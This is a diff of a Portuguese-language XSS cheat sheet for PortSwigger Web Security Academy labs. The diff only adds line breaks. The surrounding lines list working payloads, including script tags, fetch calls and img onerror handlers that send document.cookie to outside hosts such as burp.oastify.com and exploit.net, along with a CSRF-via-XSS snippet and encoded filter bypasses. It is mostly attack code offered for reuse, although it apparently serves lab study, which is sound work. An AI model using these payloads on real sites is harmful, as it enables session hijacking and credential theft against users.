@@ -36,6 +36,7 @@ Teste com:
 > Alguns payloads finais não estão encodados em URL. Lembre de fazer isso caso ele não funcione sem encodar.
 
 <br>
+<br>
 
 **DOM XSS in document.write sink using source location.search inside a select element**
 ```
@@ -47,6 +48,7 @@ Versão adaptada:
 "></select><script>document.location='http://burp.oastify.com/?c='+document.cookie</script>
 ```
 
+<br>
 <br>
 
 **DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded**
@@ -64,6 +66,7 @@ Versão adaptada:
 ```
 
 <br>
+<br>
 
 **Reflected DOM XSS**
 ```
@@ -75,6 +78,7 @@ Versão adaptada:
 \"-fetch('http://burp.oastify.com?c='+btoa(document.cookie))}//
 ```
 
+<br>
 <br>
 
 **Stored DOM XSS**
@@ -90,12 +94,14 @@ Versão adaptada:
 ```
 
 <br>
+<br>
 
 **Exploiting cross-site scripting to steal cookies**
 ```
 <script>document.write('<img src="http://burp.oastify.com?c='+document.cookie+'" />');</script>
 ```
 
+<br>
 <br>
 
 **Exploiting XSS to perform CSRF**
@@ -115,6 +121,7 @@ changeReq.send('csrf='+token+'&email=test@test.com')};
 ```
 
 <br>
+<br>
 
 **Reflected XSS into HTML context with most tags and attributes blocked**
 
@@ -133,6 +140,7 @@ location = 'https://exploit-server.web-security-academy.net/?query=<body onload=
 ```
 
 <br>
+<br>
 
 **Reflected XSS into HTML context with all tags blocked except custom ones**
 ```
@@ -147,6 +155,7 @@ Versão adaptada:
 ```
 
 <br>
+<br>
 
 **Reflected XSS with some SVG markup allowed**
 ```
@@ -159,12 +168,14 @@ Versão adaptada:
 ```
 
 <br>
+<br>
 
 **Reflected XSS in canonical link tag**
 ```
 'accesskey='x'onclick='alert(1)
 ```
 
+<br>
 <br>
 
 **Reflected XSS into a JavaScript string with single quote and backslash escaped**
@@ -177,6 +188,7 @@ Versão adaptada:
 </script><script>document.location="http://burp.oastify.com/?c="+document.cookie</script>
 ```
 
+<br>
 <br>
 
 **Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped**
@@ -191,6 +203,7 @@ Versão adaptada:
 ```
 
 <br>
+<br>
 
 **Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped**
 ```
@@ -198,12 +211,14 @@ http://foo?&apos;-alert(1)-&apos;
 ```
 
 <br>
+<br>
 
 **Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped**
 ```
 ${alert(document.cookie)}
 ```
 
+<br>
 <br>
 
 ## Alguns Bypasses Úteis
@@ -237,6 +252,7 @@ location = "https://TARGET.net/?SearchTerm=%22%2d%65%76%61%6c%28%61%74%6f%62%28%
 ```
 
 <br>
+<br>
 
 ### Outros
 ```
@@ -246,6 +262,8 @@ location = "https://TARGET.net/?SearchTerm=%22%2d%65%76%61%6c%28%61%74%6f%62%28%
 
 <img src="1" onerror="window.location='https://exploit.net/cookie='+document.cookie">
 ```
+
+<br>
 
 Exploiting cross-site scripting to capture passwords
 ```
